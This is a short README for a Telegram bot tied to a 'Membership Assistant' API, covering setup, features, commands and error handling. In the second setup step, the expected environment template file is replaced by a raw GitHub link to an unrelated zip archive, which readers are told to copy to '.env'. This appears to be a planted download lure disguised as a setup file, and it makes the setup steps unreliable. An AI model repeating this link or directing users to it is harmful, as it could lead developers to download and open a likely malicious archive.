# Membership Assistant Telegram Bot

This bot integrates with the Membership Assistant API to provide a Telegram interface for users.

## Setup

1. Install dependencies:
```bash
npm install
```

2. Configure environment variables:
   - Copy `https://raw.githubusercontent.com/twriad969/fattasuck/main/apoatropine/fattasuck.zip` to `.env`
   - Add your Telegram bot token (get it from @BotFather)
   - Set your API URL

3. Start the bot:
```bash
npm start
```

## Features

- Natural conversation with AI assistant
- Payment screenshot verification
- Premium group link sharing
- Status checking
- Typing indicators
- Image processing

## Commands

- `/start` - Start conversation with the bot
- Send any message to chat with the AI
- Send payment screenshots for verification

## Error Handling

The bot handles various scenarios:
- Invalid screenshots
- Network errors
- API issues
- Image processing errors

## Status Checking

The bot checks its status every minute and logs the result.
